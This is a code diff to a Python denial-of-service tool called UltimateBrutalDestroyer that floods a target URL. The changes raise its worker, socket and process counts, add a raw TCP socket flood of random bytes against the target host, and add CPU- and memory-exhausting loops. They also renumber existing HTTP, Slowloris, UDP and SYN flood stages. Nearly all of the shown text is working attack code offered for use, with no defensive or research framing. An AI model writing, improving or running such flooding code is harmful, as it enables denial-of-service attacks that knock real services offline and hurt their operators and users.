@@ -44,11 +44,12 @@ class UltimateBrutalDestroyer:
         self.lock = threading.Lock()
         self.running = True
         
-        # System resources - Reduced to half for Windows stability
+        # System resources - MAXIMUM POWER for ultimate destruction
         self.cpu_count = multiprocessing.cpu_count()
-        self.max_workers = self.cpu_count * 250  # Reduced from 500 to 250 workers per CPU core
-        self.max_sockets = 5000  # Reduced from 10000 to 5000
-        self.max_async_tasks = 2500  # Reduced from 5000 to 2500
+        self.max_workers = self.cpu_count * 1000  # 1000 workers per CPU core for maximum power
+        self.max_sockets = 20000  # Maximum socket connections
+        self.max_async_tasks = 10000  # Maximum async tasks
+        self.max_processes = self.cpu_count * 2  # Double the CPU cores for processes
         
         # Parse URL
         self.parsed_url = urlparse(target_url)
@@ -353,6 +354,93 @@ class UltimateBrutalDestroyer:
         
         return local_success, local_failed
 
+    def cpu_intensive_attack(self):
+        """CPU-intensive attack to utilize all CPU cores"""
+        while self.running:
+            try:
+                # Perform heavy CPU calculations
+                for _ in range(10000):
+                    if not self.running:
+                        break
+                    # Prime number calculation (CPU intensive)
+                    n = random.randint(1000, 10000)
+                    is_prime = True
+                    for i in range(2, int(n ** 0.5) + 1):
+                        if n % i == 0:
+                            is_prime = False
+                            break
+                
+                # Matrix multiplication (memory intensive)
+                size = 100
+                matrix1 = [[random.random() for _ in range(size)] for _ in range(size)]
+                matrix2 = [[random.random() for _ in range(size)] for _ in range(size)]
+                result = [[sum(matrix1[i][k] * matrix2[k][j] for k in range(size)) 
+                          for j in range(size)] for i in range(size)]
+                
+            except Exception:
+                pass
+            
+            time.sleep(0.001)  # Minimal delay for maximum CPU usage
+
+    def memory_intensive_attack(self):
+        """Memory-intensive attack to utilize all RAM"""
+        memory_blocks = []
+        while self.running:
+            try:
+                # Allocate large memory blocks
+                for _ in range(10):
+                    if not self.running:
+                        break
+                    # Allocate 1MB blocks
+                    block = bytearray(1024 * 1024)
+                    for i in range(len(block)):
+                        block[i] = random.randint(0, 255)
+                    memory_blocks.append(block)
+                
+                # Keep only last 100 blocks to prevent memory overflow
+                if len(memory_blocks) > 100:
+                    memory_blocks = memory_blocks[-100:]
+                
+            except Exception:
+                pass
+            
+            time.sleep(0.01)
+
+    def network_flood_attack(self):
+        """Ultra-aggressive network flood"""
+        while self.running:
+            try:
+                # Create multiple socket connections
+                sockets = []
+                for _ in range(100):
+                    if not self.running:
+                        break
+                    try:
+                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        sock.settimeout(1)
+                        sock.connect_ex((self.host, self.port))
+                        sockets.append(sock)
+                    except Exception:
+                        pass
+                
+                # Send data to all sockets
+                for sock in sockets:
+                    try:
+                        data = os.urandom(random.randint(1024, 8192))
+                        sock.send(data)
+                    except Exception:
+                        pass
+                    finally:
+                        try:
+                            sock.close()
+                        except Exception:
+                            pass
+                
+            except Exception:
+                pass
+            
+            time.sleep(0.001)  # Ultra-fast attack
+
     def ultimate_destruction(self):
         """Launch all attack types simultaneously using all system resources"""
         print("🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥")
@@ -370,29 +458,50 @@ class UltimateBrutalDestroyer:
         # Start all attack types
         threads = []
         
-        # 1. Multi-threaded HTTP attacks
+        # 1. Multi-threaded HTTP attacks - MAXIMUM POWER
         print("🚀 Starting HTTP thread army...")
-        thread_batch_size = 100  # Create threads in batches
-        for batch in range(0, min(self.max_workers, 1000), thread_batch_size):  # Reduced from 2000 to 1000
-            batch_end = min(batch + thread_batch_size, min(self.max_workers, 1000))
+        thread_batch_size = 200  # Larger batches for faster creation
+        for batch in range(0, min(self.max_workers, 5000), thread_batch_size):  # Increased to 5000
+            batch_end = min(batch + thread_batch_size, min(self.max_workers, 5000))
             for i in range(batch, batch_end):
                 thread = threading.Thread(target=self.brutal_http_worker, args=(i,), daemon=True)
                 thread.start()
                 threads.append(thread)
             
-            # Small delay between batches
-            time.sleep(0.05)
+            # Minimal delay for maximum speed
+            time.sleep(0.01)
             print(f"   Created {len(threads)} threads...")
         
         print(f"✅ HTTP thread army complete: {len(threads)} threads")
         
-        # 2. Slowloris attack
+        # 2. CPU-intensive attacks
+        print("🔥 Starting CPU-intensive attacks...")
+        for i in range(self.cpu_count * 4):  # 4x CPU cores for maximum CPU usage
+            cpu_thread = threading.Thread(target=self.cpu_intensive_attack, daemon=True)
+            cpu_thread.start()
+            threads.append(cpu_thread)
+        
+        # 3. Memory-intensive attacks
+        print("💾 Starting memory-intensive attacks...")
+        for i in range(self.cpu_count * 2):  # 2x CPU cores for memory usage
+            memory_thread = threading.Thread(target=self.memory_intensive_attack, daemon=True)
+            memory_thread.start()
+            threads.append(memory_thread)
+        
+        # 4. Network flood attacks
+        print("🌊 Starting network flood attacks...")
+        for i in range(self.cpu_count * 3):  # 3x CPU cores for network flooding
+            network_thread = threading.Thread(target=self.network_flood_attack, daemon=True)
+            network_thread.start()
+            threads.append(network_thread)
+        
+        # 5. Slowloris attack
         print("🐌 Starting Slowloris destroyer...")
         slowloris_thread = threading.Thread(target=self.slowloris_destroyer, daemon=True)
         slowloris_thread.start()
         threads.append(slowloris_thread)
         
-        # 3. Async attack with proper cleanup
+        # 6. Async attack with proper cleanup
         print("⚡ Starting async destroyer...")
         def run_async_attack():
             try:
@@ -425,29 +534,30 @@ class UltimateBrutalDestroyer:
         async_thread.start()
         threads.append(async_thread)
         
-        # 4. UDP flood
+        # 7. UDP flood
         print("💥 Starting UDP flood...")
         for i in range(self.cpu_count):
             udp_thread = threading.Thread(target=self.udp_flood_attack, daemon=True)
             udp_thread.start()
             threads.append(udp_thread)
         
-        # 5. SYN flood simulation
+        # 8. SYN flood simulation
         print("🔥 Starting SYN flood simulation...")
         for i in range(self.cpu_count * 2):
             syn_thread = threading.Thread(target=self.syn_flood_attack, daemon=True)
             syn_thread.start()
             threads.append(syn_thread)
         
-        # 6. Multi-process attack
+        # 9. Multi-process attack - MAXIMUM POWER
         print("🚀 Starting process army...")
-        process_pool = ProcessPoolExecutor(max_workers=self.cpu_count)
+        process_pool = ProcessPoolExecutor(max_workers=self.max_processes)
         process_futures = []
-        for i in range(self.cpu_count):
+        for i in range(self.max_processes):
             future = process_pool.submit(self.process_worker, i)
             process_futures.append(future)
         
-        print(f"💀 TOTAL DESTRUCTION INITIATED - {len(threads)} THREADS + {self.cpu_count} PROCESSES")
+        print(f"💀 TOTAL DESTRUCTION INITIATED - {len(threads)} THREADS + {self.max_processes} PROCESSES")
+        print("🔥 MAXIMUM SYSTEM RESOURCE UTILIZATION ACTIVE!")
         print("=" * 80)
         
         # Monitor and display stats
@@ -463,7 +573,9 @@ class UltimateBrutalDestroyer:
                       f"SUCCESS: {self.successful_requests:,} | "
                       f"FAILED: {self.failed_requests:,} | "
                       f"TIME: {elapsed:.0f}s | "
-                      f"THREADS: {len([t for t in threads if t.is_alive()])}", 
+                      f"THREADS: {len([t for t in threads if t.is_alive()])} | "
+                      f"CPU CORES: {self.cpu_count} | "
+                      f"MAX POWER: ACTIVE", 
                       end="", flush=True)
                 
                 time.sleep(0.5)  # Faster updates
